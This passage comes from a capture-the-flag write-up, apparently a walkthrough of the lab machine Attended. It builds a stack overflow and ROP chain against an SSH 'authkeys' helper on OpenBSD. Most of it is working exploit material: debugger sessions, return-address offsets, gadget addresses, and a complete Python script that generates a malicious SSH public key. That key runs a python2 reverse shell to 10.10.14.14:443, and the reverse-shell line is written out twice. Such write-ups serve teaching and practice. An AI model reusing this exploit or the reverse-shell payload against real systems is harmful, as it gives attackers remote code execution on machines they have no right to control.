It’s important that the first bit these integer values be 0, or they’ll be treated as negative numbers, which leads to an error that looks like:

```

Load key "[keyname]": invalid format 

```

### Exploit Strategy

#### Overview

I have a vector for an exploit here. If, as the note and commented config on Attended suggest, AttendedGW is running this `authkeys` binary, there’s a buffer overflow in the forth argument. That forth arg is the public key associated with a login attempt.

If I can craft a SSH key such that the public key is too long, and it overflows the buffer, I can get remote code execution on AttendedGW.

To bring this exploit into being, I’ll need the following steps:
- Find offset to overwrite return address in public key.
- Identify SYSCALL for payload
- Find gadgets to set rax, rdi, rsi, and rdx.
- Map out buffer.
- Script it to write malicious key.

#### Dev Environment

I mentioned above that I created an OpenBSD VM for this box. I like to code in my normal Parrot VM, so I wrote Python there, and then SSHed into the OpenBSD VM to run `gdb`. `gdb` kind of sucked on OpenBSD. Because the binary was stripped, to step, it wouldn’t work with `n` or `s`, but `ni` and `si` worked. I wasn’t able to get [Peda](https://github.com/longld/peda) working (could be user error). I understand some (believe xct was the source here) were able to get [GEF](https://github.com/hugsy/gef) installed with the following steps:

```

# pkg_add -v gdb
# pkg_add wget
# pkg_add nano
# pkg_add py3-pip
# pkg_add git
# wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
# echo source ~/.gdbinit-gef.py >> ~/.gdbinit
# export LC_CTYPE=C.UTF-8 (so python error does not occur)
# egdb

```

`gdb` didn’t come with the Python support compiled in, but `egdb` did.

To run the program, as the first three args didn’t matter, I would run `r a a a [base64 part of key]`.

### Find Offset for RIP

I’ll use `msf-pattern_create` to generate a pattern string. I know the buffer is 0x300 bytes, so I’ll generate 0x400 (should be more than enough). Because the input is base64-decoded before it overflows, I’ll encode the pattern:

```

oxdf@parrot$ msf-pattern_create -l 0x400 | base64 -w0
QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwzQWw0QWw1QWw2QWw3QWw4QWw5QW0wQW0xQW0yQW0zQW00QW01QW02QW03QW04QW05QW4wQW4xQW4yQW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAxQXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIwQXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0QmM1QmM2QmM3QmM4QmM5QmQwQmQxQmQyQmQzQmQ0QmQ1QmQ2QmQ3QmQ4QmQ5QmUwQmUxQmUyQmUzQmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcyQmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQmgzQmg0Qmg1Qmg2Qmg3Qmg4Qmg5QmkwQgo=

```

I’ll use that as the forth arg, and run to the `SIGSEGV`:

```

(gdb) r a a a QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwzQWw0QWw1QWw2QWw3QWw4QWw5QW0wQW0xQW0yQW0zQW00QW01QW02QW03QW04QW05QW4wQW4xQW4yQW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAxQXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIwQXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0QmM1QmM2QmM3QmM4QmM5QmQwQmQxQmQyQmQzQmQ0QmQ1QmQ2QmQ3QmQ4QmQ5QmUwQmUxQmUyQmUzQmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcyQmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQmgzQmg0Qmg1Qmg2Qmg3Qmg4Qmg5QmkwQgo=
Starting program: /root/authkeys a a a QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwzQWw0QWw1QWw2QWw3QWw4QWw5QW0wQW0xQW0yQW0zQW00QW01QW02QW03QW04QW05QW4wQW4xQW4yQW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAxQXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIwQXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0QmM1QmM2QmM3QmM4QmM5QmQwQmQxQmQyQmQzQmQ0QmQ1QmQ2QmQ3QmQ4QmQ5QmUwQmUxQmUyQmUzQmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcyQmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQmgzQmg0Qmg1Qmg2Qmg3Qmg4Qmg5QmkwQgo=
warning: shared library handler failed to enable breakpoint
Evaluating key...

Program received signal SIGSEGV, Segmentation fault.
0x000000000040036b in ?? ()

```

rsp holds the address that would have gone into rip had it been in a valid range:

```

(gdb) x/xg $rsp
0x7f7ffffe4b98: 0x42306142397a4138

```

`msf-pattern_offset` will show how far into the pattern that occurred:

```

oxdf@parrot$ msf-pattern_offset -q 0x42306142397a4138
[*] Exact match at offset 776

```

776 is 0x308, which makes sense given I know the buffer was 0x300.

I tested it by taking a legit large SSH public key, decoding it, and changing the eight bytes at offset 0x308 to 0x0000000004003a9. This address is the start of the code that prints the message about the wrong number of args. So the code will run, check the right number of args, print that it’s evaluating the key, then overflow and end up back at the message about there being the wrong number of args.

```

obsd# ./authkeys a a a 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
Evaluating key...
Too bad, Wrong number of arguments!

```

That shows the overflow worked and that the exploit gained control over rip.

### ROP

#### Strategy

Looking at the [OpenBSD Syscalls](https://github.com/openbsd/src/blob/master/sys/kern/syscalls.master) I can use `execve` to run whatever I want. Because I’ll be executing on another system, I can’t just run `/bin/sh` like I might in a standard local privesc. I know from the emails that legacy Python is on the gateway, so I’ll try to get a reverse shell there with a call like this:

```

execve("/usr/local/bin/python2", ["/usr/local/bin/python2", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"], 0)

```

I noticed during the RE that the binary is using `syscall` regularly, and there’s even a function that was `syscall; ret` (though the return is relatively unnecessary), so that should be an easy gadget to find. I’ll need to set rax to 0x3b (59) for `execve`, rdi to the binary string, rsi to the array of args, and rdx to null.

The binary is quite limited in what it has to offer for each of these, and it will make two of them quite challenging.

#### Gadgets

I’ll use [Ropper](https://github.com/sashs/Ropper) (`pip install ropper`) to look for gadgets:

```

oxdf@parrot$ ropper --file authkeys 
[INFO] Load gadgets from cache             
[LOAD] loading... 100%                          
[LOAD] removing double gadgets... 100% 
...[snip]...
0x0000000000400367: mov rdi, rsi; pop rdx; ret;
...[snip]...
0x000000000040036a: pop rdx; ret; 
...[snip]...
0x00000000004003cf: syscall; ret; 

```

The three above there will be useful. I can set rdx freely with the `pop rdx; ret` gadget. I can make the `syscall` as well. There is no easy way to set rdi, but the `mov rdi, rsi; pop rdx; ret;` says that if I can solve the problem of setting rsi, then I can also set rdi with this.

All that is missing now is a ways to set rax and rsi.

#### rax

Looking at all the gadgets, there aren’t many that interact with rax in a useful way. Still, with some creative thinking, I can get anything I want in the low byte of rax using these two gadgets:

```

0x000000000040036d: not al; adc cl, 0xe8; ret;
0x0000000000400370: shr eax, 1; ret;

```

I know that just before the return where the address is overwritten, rax is zeroed (along with rsi and rdi):

![image-20210505144749545](https://0xdfimages.gitlab.io/img/image-20210505144749545.png)

`not al` (ignoring the changes to cl as I don’t care about rcx) will take the lowest byte in rax and invert it, changing all the 0s to 1s and 1s to 0s. Because I know the bits higher than the low eight are 0, `shr eax, 1` will remove the bit on the right, and add a 0 on the left.

To understand the algorithm needed to generate any number 0-255, I will look at it in binary. 59 is `00111011`. I’ll first invert al so it has all 1s:

```

11111111

```

Next I’ll work from right to left on the target binary string. It starts with two 1s, so I’ll shift twice and not:

```

shr: 01111111
shr: 00111111
not: 11000000

```

Next there is one 0, so shift once, then invert:

```

shr: 01100000
not: 10011111

```

Now three 1s, so shift three times, then invert:

```

shr: 01001111
shr: 00100111
shr: 00010011
not: 11101100

```

Finally, two 0s, so shift twice (and no need to invert):

```

shr: 01110110
shr: 00111011 = 0x3b = 59

```

#### rsi

The path to get something into rsi was tricker, as the number of gadgets that moved useful data into rsi was very limited. This gadget will move something from xmm0 to esi:

```

0x0000000000400380: cvtss2si esi, xmm0; ret;

```

If I can get an address up to four bytes into xmm0, then I can use this to get it into rsi. There’s another gadget that will move a double-word into xmm0:

```

0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;

```

And this one comes from something pointed to by rdx, which I can control easily. So this looks like something I can work with.

`movss` is [Move Scalar Single-Precision Floating-Point Value](https://www.felixcloutier.com/x86/movss). So in this case, it will get an address from rdx, and create a float from the bytes at that address, and move it into xmm0 (one of the floating point registers). So I’ll need to convert whatever value I want to come out of this into a float first before storing it.

`cvtss2si` is [Convert Scalar Single-Precision Floating-Point](https://www.felixcloutier.com/x86/cvtss2si). This gadget will convert the floating point number that was loaded into xmm0 back to an int and store it in esi, the low four bytes of rsi. I noted above that the high four bytes will be null.

### Memory Layout

#### Find Buffer

For the gadgets above to work, I need to have a place I can write these strings and then have pointers to them. Luckily for me, after the base64 key is decoded onto the stack (into too short a buffer), the first 0x300 bytes of that are copied into a buffer at a static address that doesn’t move around, 0x6010c0:

![image-20210505163523496](https://0xdfimages.gitlab.io/img/image-20210505163523496.png)

rax is the number of bytes written to this point. It checks if that’s greater than 0x300, and if so, sets eax (so rax) to 0x300. Then it copies rax to rcx. The address of the decoded output (rsp) is copied to rsi, and the static buffer is copied to rdi. Then it calls `rep movsb`, which effectively copies rcx bytes from rsi to rdi.

So as long as I write things I need in the first 0x300 bytes of the payload, I can reliably reference know what address they will end up at in that buffer.

#### Structure of Payload

Understanding the buffer, here is how I will lay out the SSH public key to be submitted:

![](https://0xdfimages.gitlab.io/img/attended-memory.png)

In this image, the green parts will be copied into the buffer with the known memory address, 0x6010c0. The ROP (yellow) can reference those.

### Script

This all comes together to make a script that generates a malicious public SSH key ([full source](/files/attended-genkey.py)).

It starts with imports and defining some constants and gadgets:

```

#!/usr/bin/env python3

import pyperclip 
import struct
from base64 import b64encode
from pwn import *

# set constants
ip = '10.10.14.14'
port = 443
shell = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\0'.encode()
execve_args = [b'/usr/local/bin/python2\0', b'-c\0', shell]        
base_addr = 0x6010c0

# Gadgets
pop_rdx = p64(0x40036a)
not_al = p64(0x40036d)
shr_eax = p64(0x400370)
movss_rdx = p64(0x40037b) # moves floating point value into xmm0
cvtss2si_esi = p64(0x400380)  # converts float in xmm0 to int in esi
mov_rdi_rsi_pop_rdx = p64(0x400367)
syscall = p64(0x4003cf)

```

Now I’ll start the buffer. First I’ll lay out the three parts of a public SSH RSA key (`name`, `e`, and `n`). I’ll define all but the `n`, as that will be the body I’ll be working in.

```

# SSH header
buf = b''
buf += p32(7, endian='big')      # name len
buf += b'ssh-rsa'                # name
buf += p32(3, endian='big')      # e len
buf += pack(0x10001, 24, endian='big') # e
buf += p32(0x500 - 22, endian='big')  # length of n
buf += b'\x00\xcc'               # bytes from real n to get started

```

For some reason, I needed to include at least a couple bytes from a legit `n` to get the `ssh` client to accept this key as valid. When I was getting errors, I started by copying the first eight bytes of `n`, and then once I had a working script, removed bytes one at a time until it stopped working with less than two. I thought maybe the null byte might be necessary to make sure the `n` isn’t negative, but I can’t explain why I needed 0xcc (there are others that work there and others that don’t). Hit me up on twitter or discord if you can explain this.

Next, I’ll loop over the args and get those strings into the buffer, for each one recording the address that it will be at:

```

# Add strings, record addr of each
execve_args_addrs = []
for arg in execve_args:
    execve_args_addrs += [len(buf) + base_addr]
    buf += arg

```

I can calculate the address from that static base address plus the length of the buffer before I add the item.

Now I need the array of pointers to those strings. I’ll loop over the addresses, adding them, and then a null to end the array:

```

# Add pointers to each string, recording start of array
vars_array_addr = len(buf) + base_addr
for addr in execve_args_addrs:
    buf += p64(addr) 
buf += p64(0)  # null terminal array of pointers

```

Next I need the addresses of the Python string and the args array, but each packed as a float. I’ll use `struct.pack` to handle that, recording the address that each sits at.

```

# Add addr of "python2" str as float, record addr
python_str_as_float = len(buf) + base_addr
buf += struct.pack('<f', execve_args_addrs[0]).ljust(8, b'\0')

# Add addr of array of string pointers as float, record address
args_array_as_float = len(buf) + base_addr
buf += struct.pack('<f', vars_array_addr).ljust(8, b'\0')

```

All the data I need is now in the buffer, so I’ll pad with nulls to reach the return address overwrite:

```

# Spacing to get to return address 
buf += b"\0" * (0x308 - len(buf))

```

At this point I’ll start the ROP. The order can vary, but rdi has to be before rsi, and both of those have to be before rdx. rax can be at any point. Of course once I set all four, I’ll jump to the `syscall`.

```

# ROP 
## rax --> 59
#           start 00000000
buf += not_al   # 11111111
buf += shr_eax  # 01111111
buf += shr_eax  # 00111111
buf += not_al   # 11000000
buf += shr_eax  # 01100000
buf += not_al   # 10011111
buf += shr_eax  # 01001111
buf += shr_eax  # 00100111
buf += shr_eax  # 00010011
buf += not_al   # 11101100
buf += shr_eax  # 01110110
buf += shr_eax  # 00111011 = 59 = 0x3b

## rdi --> pointer to "/usr/local/bin/python2"
buf += pop_rdx
buf += p64(python_str_as_float)
buf += movss_rdx
buf += cvtss2si_esi
buf += mov_rdi_rsi_pop_rdx  # move to rdi, and get next rdx

## rsi --> pointer to args array
buf += p64(args_array_as_float)
buf += movss_rdx
buf += cvtss2si_esi

## rdx --> 0 (no env)
buf += pop_rdx
buf += p64(0)

## syscall
buf += syscall

```

Now I’ll fill out the size I set earlier in the header with nulls, and encode the buffer to base64 to insert in to a key:

```

# Encode Buffer
b64str = b64encode(buf.ljust(0x500, b'\0')).decode()

```

Now, I’ll output the key three different ways for convenience, writing it to a file, printing it the the screen, and saving it to my clipboard (this allowed me to easily move it to the OpenBSD system for testing, or look at it locally):

```

#key = f'run a a a {b64str}'    
key = f'ssh-rsa {b64str} 0xdf'
# Output three ways
with open('aaaa.pub', 'w') as f:
    f.write(key)                     
print(key)
pyperclip.copy(key)

```

During `gdb` testing, I used a different format of output, writing `r a a a [base64]`, allowing me to just copy that and paste it into `gdb` to start a new run.

When I run this, the key is printed:

```

oxdf@parrot$ python genkey.py 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAE6gDML3Vzci9sb2NhbC9iaW4vcHl0aG9uMgAtYwBpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTQiLDQ0MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7ANgQYAAAAAAA7xBgAAAAAADyEGAAAAAAAAAAAAAAAAAAsCHASgAAAACSI8BKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABqA0AAAAAAAOkRYAAAAAAAewNAAAAAAACAA0AAAAAAAGcDQAAAAAAA8RFgAAAAAAB7A0AAAAAAAIADQAAAAAAAagNAAAAAAAAAAAAAAAAAAM8DQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= 0xdf

```

I could edit the buffer into a private key as well, but a public key worked just fine for exploiting attended.

### Shell

I’ll save the key to a file on Attended:

```

attended$ cat .0xdf
